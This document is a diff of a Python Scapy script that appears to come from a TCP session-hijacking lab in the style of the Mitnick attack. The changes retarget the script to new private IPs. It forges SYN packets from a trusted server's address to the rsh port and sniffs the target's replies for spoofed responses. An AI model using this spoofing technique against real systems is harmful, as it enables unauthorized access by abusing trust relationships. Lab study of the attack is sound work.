@@ -2,7 +2,7 @@
 from scapy.all import *
 import sys
 
-X_terminal_IP = "10.9.0.5"
+X_terminal_IP = "10.0.2.8"
 X_terminal_Port = 514
 
 Trusted_Server_IP = "10.9.0.6"
@@ -33,14 +33,14 @@ def spoof_pkt(pkt):
 
 def spoofing_SYN():
 	print("Sending Spoofed SYN Packet ...")
-	IPLayer = IP(src="10.9.0.6", dst="10.9.0.5")
+	IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
 	TCPLayer = TCP(sport=1023,dport=514,flags="S", seq=3371271375)
 	pkt = IPLayer/TCPLayer
 	send(pkt,verbose=0,iface="br-5429bb7a6ef2")
 
 def main():
 	spoofing_SYN()
-	pkt = sniff(filter="tcp and src host 10.9.0.5", prn=spoof_pkt,iface="br-5429bb7a6ef2")
+	pkt = sniff(filter="tcp and src host 10.0.2.8", prn=spoof_pkt,iface="br-5429bb7a6ef2")
 
 if __name__ == "__main__":
 	main()
